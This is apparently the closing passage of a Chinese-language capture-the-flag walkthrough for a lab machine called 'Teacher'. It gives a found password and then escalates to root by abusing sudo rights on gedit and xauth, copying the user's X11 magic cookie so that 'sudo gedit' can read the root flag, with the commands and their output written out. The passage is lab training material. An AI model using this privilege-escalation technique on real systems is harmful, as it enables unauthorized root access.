在最后看见了一个折痕内容，猜测是mrteacher用户的密码

这样就可以看到pass了，ThankYouTeachers

提权至root

这里登录时，推荐使用kali页面终端进行登录，因为读取文件时用到了界面读取

mrteacher@Teacher:~$ sudo -l
Matching Defaults entries for mrteacher on Teacher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrteacher may run the following commands on Teacher:
    (ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth

直接运行gedit只能读取userflag不能读取rootflag

但是要读取rootflag还要将具有sudo权限的xauth的标志修改为一样的内容

mrteacher@Teacher:~$ xauth list
Teacher/unix:10  MIT-MAGIC-COOKIE-1  493ee1091e785284fbc77f5097c7c954
mrteacher@Teacher:~$ sudo xauth list
Teacher/unix:10  MIT-MAGIC-COOKIE-1  b3386aefd470a6e309e54bc1be5eb774

因此要修改为一样的内容

mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1 493ee1091e785284fbc77f5097c7c954

然后在命令行内输入下面的命令将gedit的界面调用出来

mrteacher@Teacher:~$ sudo gedit

(gedit:27964): dbind-WARNING **: 16:06:47.497: Couldn't connect to accessibility bus: Failed to connect to socket /run/user/1000/at-spi/bus_0: No such file or directory

然后就可以读取rootflag了

flag

mrteacher@Teacher:~$ cat user
